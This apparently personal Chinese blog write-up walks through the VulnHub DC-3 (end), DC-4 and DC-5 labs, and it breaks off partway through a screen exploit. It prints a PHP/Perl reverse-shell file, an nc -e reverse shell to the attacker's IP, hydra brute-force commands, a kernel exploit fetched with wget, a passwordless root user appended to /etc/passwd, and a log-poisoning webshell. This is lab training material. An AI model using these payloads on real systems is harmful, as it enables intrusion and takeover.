<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a32ea76c349.png" alt="屏幕截图 2024-07-26 130449.png"></p>
<p>new file一个php弹shell的文件</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function which($pr) &#123;</span><br><span class="line">	$path = <span class="built_in">execute</span>(<span class="string">&quot;which $pr&quot;</span>)<span class="comment">;</span></span><br><span class="line">	<span class="keyword">return</span> ($path ? $path : $pr)<span class="comment">;</span></span><br><span class="line">	&#125;</span><br><span class="line">function <span class="built_in">execute</span>($cfe) &#123;</span><br><span class="line">	$res = <span class="string">&#x27;&#x27;</span><span class="comment">;</span></span><br><span class="line">	<span class="keyword">if</span> ($cfe) &#123;</span><br><span class="line">		<span class="keyword">if</span>(function_exists(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">			<span class="symbol">@exec</span>($cfe,$res)<span class="comment">;</span></span><br><span class="line">			$res = join(<span class="string">&quot;\n&quot;</span>,$res)<span class="comment">;</span></span><br><span class="line">			&#125; </span><br><span class="line">			<span class="keyword">elseif</span>(function_exists(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line">			$res = <span class="symbol">@shell_exec</span>($cfe)<span class="comment">;</span></span><br><span class="line">			&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line"><span class="symbol">@ob_start</span>()<span class="comment">;</span></span><br><span class="line"><span class="symbol">@system</span>($cfe)<span class="comment">;</span></span><br><span class="line">$res = <span class="symbol">@ob_get_contents</span>()<span class="comment">;</span></span><br><span class="line"><span class="symbol">@ob_end_clean</span>()<span class="comment">;</span></span><br><span class="line">&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line"><span class="symbol">@ob_start</span>()<span class="comment">;</span></span><br><span class="line"><span class="symbol">@passthru</span>($cfe)<span class="comment">;</span></span><br><span class="line">$res = <span class="symbol">@ob_get_contents</span>()<span class="comment">;</span></span><br><span class="line"><span class="symbol">@ob_end_clean</span>()<span class="comment">;</span></span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="symbol">@is_resource</span>($f = <span class="symbol">@popen</span>($cfe,<span class="string">&quot;r&quot;</span>))) &#123;</span><br><span class="line">$res = <span class="string">&#x27;&#x27;</span><span class="comment">;</span></span><br><span class="line"><span class="keyword">while</span>(!<span class="symbol">@feof</span>($f)) &#123;</span><br><span class="line">$res .= <span class="symbol">@fread</span>($f,<span class="number">1024</span>)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="symbol">@pclose</span>($f)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $res<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">function cf($fname,$text)&#123;</span><br><span class="line"><span class="keyword">if</span>($fp=<span class="symbol">@fopen</span>($fname,<span class="string">&#x27;w&#x27;</span>)) &#123;</span><br><span class="line"><span class="symbol">@fputs</span>($fp,<span class="symbol">@base64_decode</span>($text))<span class="comment">;</span></span><br><span class="line"><span class="symbol">@fclose</span>($fp)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$yourip = <span class="string">&quot;192.168.111.128&quot;</span><span class="comment">;</span></span><br><span class="line">$yourport = <span class="string">&#x27;2333&#x27;</span><span class="comment">;</span></span><br><span class="line">$usedb = array(<span class="string">&#x27;perl&#x27;</span>=&gt;<span class="string">&#x27;perl&#x27;</span>,<span class="string">&#x27;c&#x27;</span>=&gt;<span class="string">&#x27;c&#x27;</span>)<span class="comment">;</span></span><br><span class="line">$back_connect=<span class="string">&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&quot;</span>.</span><br><span class="line"><span class="string">&quot;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&quot;</span>.</span><br><span class="line"><span class="string">&quot;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&quot;</span>.</span><br><span class="line"><span class="string">&quot;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&quot;</span>.</span><br><span class="line"><span class="string">&quot;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&quot;</span>.</span><br><span class="line"><span class="string">&quot;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&quot;</span>.</span><br><span class="line"><span class="string">&quot;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;</span><span class="comment">;</span></span><br><span class="line">cf(<span class="string">&#x27;/tmp/.bc&#x27;</span>,$back_connect)<span class="comment">;</span></span><br><span class="line">$res = <span class="built_in">execute</span>(which(<span class="string">&#x27;perl&#x27;</span>).<span class="string">&quot; /tmp/.bc $yourip $yourport &amp;&quot;</span>)<span class="comment">;</span></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>记得保存上传，根据joomla的特性，模块会单独放在一个文件夹里&#x2F;templates&#x2F;，而beez3模块就在&#x2F;templates&#x2F;beez3&#x2F;里面，访问刚才写入的弹shell的php文件就能监听到了</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">111.135</span><span class="regexp">/templates/</span>beez3/shell.php</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a32a648fe61.png" alt="image-20240718183426554.png"></p>
<p>弄个交互式shell</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p>不是root权限，下一步就是提权了</p>
<h2 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h2><p>前面两个靶场学的提权手法都不能用，先看下操作系统的版本，看看有没有内核的漏洞，详情参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/guo_qiangqiang/article/details/106925996">查看Linux当前操作系统版本信息常用命令</a> </p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cat</span> /etc/issue                         <span class="comment">//查看操作系统</span></span><br><span class="line"><span class="keyword">cat</span> /proc/<span class="keyword">version</span>                      <span class="comment">//查看内核版本</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a32a64b34e4.png" alt="image-20240718220948450.png"></p>
<p>用之前提到的searchsploit工具找下看有没有相关漏洞的利用</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">searchsploit</span> Ubuntu <span class="number">16</span>.<span class="number">04</span></span><br></pre></td></tr></table></figure>

<p>找到一个有关提权的漏洞，Privilege Escalation就是提权的意思</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a32a6504b01.png" alt="image-20240718221258951.png"></p>
<p>打开漏洞的相关介绍，最后两行给出了漏洞原理和exp</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a32c6a08520.png" alt="image-20240718224621686.png"></p>
<p>还给了怎么用exp打</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a32a651d090.png" alt="image-20240718230105647.png"></p>
<p>按上面来看就是把exp下到要提权的靶机上再执行compile.sh和doubleput这两个文件就行</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https:<span class="string">//gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip</span>        <span class="string">//</span>下载exp的压缩包到靶机</span><br><span class="line">unzip 39772.zip          </span><br><span class="line"><span class="keyword">cd</span> 39772</span><br><span class="line">tar -xvf exploit.tar</span><br><span class="line"><span class="keyword">cd</span> ebpf_mapfd_doubleput_exploit</span><br><span class="line"><span class="string">./compile.sh</span></span><br><span class="line"><span class="string">./doubleput</span></span><br></pre></td></tr></table></figure>

<p>拿到root</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a32a64eecbb.png" alt="image-20240718230546932.png"></p>
<p>最后找下flag</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -name <span class="number">*f</span>lag* </span><br></pre></td></tr></table></figure>

<p>多半都在root目录下，获得最终flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a32a650cf0e.png" alt="屏幕截图 2024-07-18 230010.png"></p>
<h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>又学到了几个新工具的使用，前期的信息收集和漏洞查找用工具梭还是挺好用的，后面漏洞利用和提权也是靠现成的脚本，提权还能用内核漏洞提，以前没见过，但说实话，估计实战很少有这种利用环境</p>
<h1 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h1><p>官网下载：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-4.zip">https://download.vulnhub.com/dc/DC-4.zip</a></p>
<h2 id="信息收集-3"><a href="#信息收集-3" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">namp -<span class="selector-tag">A</span> -<span class="selector-tag">p</span>- <span class="number">192.168</span>.<span class="number">111.136</span></span><br></pre></td></tr></table></figure>

<p>开了ssh和80端口的web服务</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a3505f50b5a.png" alt="image-20240718232700897.png"></p>
<p>扫下目录</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">dirsearch</span> -u <span class="number">192.168.111.136</span> -e * -x <span class="number">404</span></span><br></pre></td></tr></table></figure>

<p>没啥有用的，访问了下web服务只有个登录框</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a3505d16633.png" alt="image-20240718232935412.png"></p>
<p>稍微手测了一下，啥回显都没有，估计是爆破了要</p>
<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>抓了个包发现是以POST传参，用hydra爆下</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt <span class="number">192.168</span>.<span class="number">111.136</span> http-post-form <span class="string">&quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot;</span> -F</span><br></pre></td></tr></table></figure>

<blockquote>
<p>&#x2F;login.php：表单提交的URL</p>
<p>username&#x3D;^USER^&amp;password&#x3D;^PASS^：表单参数，其中 <code>^USER^</code> 和 <code>^PASS^</code> 会被 Hydra 分别替换为用户名和密码</p>
<p>S&#x3D;logout：成功登录后的标志，这里假设是出现 <code>logout</code>，正常来说登录进去后都会有退出的选项</p>
<p>-F：告诉 Hydra 在找到第一个匹配项后停止</p>
<p>冒号的作用就是分隔</p>
</blockquote>
<p>找到了admin的密码happy</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a3508fdc9bb.png" alt="image-20240719001821965.png"></p>
<p>登进去后有个命令执行的地方，抓个包看下参数名是啥，咋传的参</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a3508fc4fb5.png" alt="image-20240719002343463.png"></p>
<p>直接弹shell，先kali上把监听开起，再传</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -e /bin/bash <span class="number">192.168.111.128</span> <span class="number">2333</span></span><br></pre></td></tr></table></figure>

<p>还是弄个交互式的shell，好看</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty;pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="Liunx提权-1"><a href="#Liunx提权-1" class="headerlink" title="Liunx提权"></a>Liunx提权</h2><p>先sudo -l看下，结果要密码，然后就想到的是suid提权，看看哪些是suid权限</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a350900a4be.png" alt="image-20240719141844347.png"></p>
<p>呃感觉都没啥用，最后一个jim用户下还有个脚本能suid权限运行，去看看</p>
<p>进入jim目录下，有个backups目录，mbox和test.sh，脚本没啥用，mbox权限不够不能打开，backups目录下到有个old-passwords.bak，打开发现是一堆密码，看文件名猜应该是用过的旧密码，那直接开爆，应该是连ssh，毕竟最开始就知道开了ssh，这里用到一个工具，超级弱口令检查工具</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a35090560d0.png" alt="image-20240719144043906.png"></p>
<p>也可以用hydra</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jim -P <span class="regexp">/home/</span>kali<span class="regexp">/Desktop/</span>pass.txt -t <span class="number">50</span> ssh:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">111.136</span></span><br></pre></td></tr></table></figure>

<p>超级弱口令工具爆的快点，不愧是超级，密码是jibril04，ssh连接</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh</span> jim@<span class="number">192.168.111.136</span></span><br></pre></td></tr></table></figure>

<p>登录jim账户就能打开mbox了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a35090182b6.png" alt="image-20240719144625583.png"></p>
<p>说是有一封root用户给jim用户，也就是我的邮件，去邮箱<code>/var/spool/mail</code>看下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a350b43cf7c.png" alt="image-20240719144917112.png"></p>
<p>得到charles用户密码^xHhA&amp;hvim0y，su切换到charles用户，呃还不是root权限，看看这个charles用户能不能提权</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a350b433b6c.png" alt="image-20240719150152955.png"></p>
<p>teehee命令（小型文本编辑器）是root权限，可以用这个命令提权，&#x2F;etc&#x2F;passwd是存放用户名和密码的文件，我们可以向文件中写入一个root权限的用户再登录就可以达到提权的效果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;6s6::0:0:::/bin/bash&quot;</span> | sudo teehee -a /etc/passwd  </span><br></pre></td></tr></table></figure>

<p>创建一个用户名为6s6的用户，并且uid为0即root权限，密码为空，可以直接登录</p>
<blockquote>
<p>&#x2F;etc&#x2F;passwd文件格式</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[用户名]</span>：<span class="selector-attr">[密码]</span>：<span class="selector-attr">[UID]</span>：<span class="selector-attr">[GID]</span>：<span class="selector-attr">[身份描述]</span>：<span class="selector-attr">[主目录]</span>：<span class="selector-attr">[登录shell]</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>更多详细参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/10503978.html">编辑&#x2F;etc&#x2F;passwd文件进行权限升级的技巧</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a350b4bac3d.png" alt="image-20240719151153166.png"></p>
<p>su到6s6用户发现是root权限，提权成功，最后就是找flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a350b4409fc.png" alt="image-20240719151655853.png"></p>
<h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>相比于前几个靶机，这个算是简单的了，都没啥漏洞的利用，就是弱口令加点简单提权，又学到了点提权的知识</p>
<h1 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h1><p>官网下载：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-5.zip">https://download.vulnhub.com/dc/DC-5.zip</a></p>
<h2 id="信息收集-4"><a href="#信息收集-4" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">nmap -<span class="selector-tag">A</span> -<span class="selector-tag">p</span>- <span class="number">192.168</span>.<span class="number">111.137</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a351a2ce91f.png" alt="image-20240719164045529.png"></p>
<p>开了三个端口，80端口的web服务，111端口是rpcbind，rpcbind详情参考文章：<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000040170172">rpcbind 详解</a></p>
<p>访问web服务的话contact倒是可以输东西，但没啥用，没测出有啥漏洞，服务器是nginx，php写的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a351a2d573f.png" alt="image-20240719175136144.png"></p>
<p>扫下目录</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">dirsearch</span> -u <span class="number">192.168.111.137</span></span><br></pre></td></tr></table></figure>

<p>有个footer.php，是每个页面下方的年份，每刷新一次就可能会变化</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a351a310069.png" alt="image-20240719171727901.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a351a312057.png" alt="屏幕截图 2024-07-19 171543.png"></p>
<p>还有个thankyou.php，就是contact提交后跳转的那个页面，它下方那个年份每次刷新也会变化，猜测footer.php包含了thankyou.php，也有可能是后端代码随机生成的结果</p>
<h2 id="渗透过程-1"><a href="#渗透过程-1" class="headerlink" title="渗透过程"></a>渗透过程</h2><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>包含肯定有个参数，试下GET传参爆破一下，就读&#x2F;etc&#x2F;passwd，加好参数和字典就开爆</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a351a2ee7ca.png" alt="image-20240719174923422.png"></p>
<p>file参数读成功了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a351a340956.png" alt="image-20240719175026638.png"></p>
<p>nginx服务器的话就想到日志文件写马了，先看下nginx的配置</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?f</span>ile=<span class="regexp">/etc/nginx</span><span class="regexp">/nginx.conf</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a351a425010.png" alt="image-20240719175352299.png"></p>
<p>开了日志服务，也给了错误日志服务的文件路径，看了下错误日志，记录了传参错误使的url和referer头，先传个马</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="number">6</span>s6=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="number">1</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后文件包含就可以rce了</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">file</span>=/<span class="keyword">var</span>/<span class="keyword">log</span>/nginx/<span class="keyword">error</span>.<span class="keyword">log</span>&amp;1=whoami</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a351a49670c.png" alt="image-20240722165707718.png"></p>
<p>呃我这包含错误日志不知道为啥又用不了了，包含access.log文件算了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a351a45cf61.png" alt="image-20240722172753577.png"></p>
<p>蚁剑连接成功后反弹shell</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a351c6a584e.png" alt="image-20240722173225681.png"></p>
<p>刚才纳闷错误日志包含rce都行，为啥不能弹shell，结果是ip写错了,   写成靶机的ip了</p>
<h3 id="Linux提权-1"><a href="#Linux提权-1" class="headerlink" title="Linux提权"></a>Linux提权</h3><p>依然先是来个好看的交互界面</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p>sudo -l没东西,  看看suid提权</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p>呃好像也没有利用点，有个screen-4.5.0，去漏洞库看看能不能利用</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2024/07/26/66a351c5abf7b.png" alt="image-20240722175207002.png"></p>
<p>有个exp，exp中是两个c文件，按他的要求先创好两个c文件</p>
<p>libhax.c</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dropshell</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">chown</span>(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">chmod</span>(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    <span class="built_in">unlink</span>(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>rootshell.c</p>
